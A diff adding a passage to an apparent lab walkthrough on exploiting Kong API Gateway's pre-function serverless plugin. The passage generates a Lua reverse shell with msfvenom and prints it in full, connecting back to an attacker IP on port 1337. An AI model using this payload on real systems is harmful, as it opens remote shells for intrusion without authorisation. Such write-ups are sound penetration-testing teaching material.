@@ -699,4 +699,21 @@ The **`Serverless Functions`** plugin has an interesting warning in its document
 Warning: The pre-function and post-function serverless plugin allows anyone who can enable the plugin to execute arbitrary code. If your organization has security concerns about this, disable the plugin in your `kong.conf` file.
 ```
 
-That sounds perfect for our purposes!
+That sounds perfect for our purposes! Let's check if Kong has that plugin loaded.
+
+Our first call to the Kong API Gateway Admin API actually contained information about what plugins are enabled on the server.
+```json
+{"plugins":{"enabled_in_cluster":["key-auth"],"available_on_server":{"grpc-web":true,"correlation-id":true,"pre-function":true,"cors":true,...
+```
+Since the **`pre-function` plugin is enabled**, let's try to exploit that. The plugin runs Lua code so we'll need to build a matching payload. We can use `msfvenom` to generate a reverse shell payload.
+```bash
+msfvenom -p cmd/unix/reverse_lua lhost=192.168.45.203 lport=1337 -f raw -o shell.lua
+```
+Our `shell.lua` payload
+```bash
+┌──(kali㉿kali)-[~]
+└─$ cat shell.lua 
+lua -e "local s=require('socket');local t=assert(s.tcp());t:connect('192.168.45.203',1337);while true do local r,x=t:receive();local f=assert(io.popen(r,'r'));local b=assert(f:read('*a'));t:send(b);end;f:close();t:close();"                                                                                                                                                                                             
+┌──(kali㉿kali)-[~]
+└─$
+```
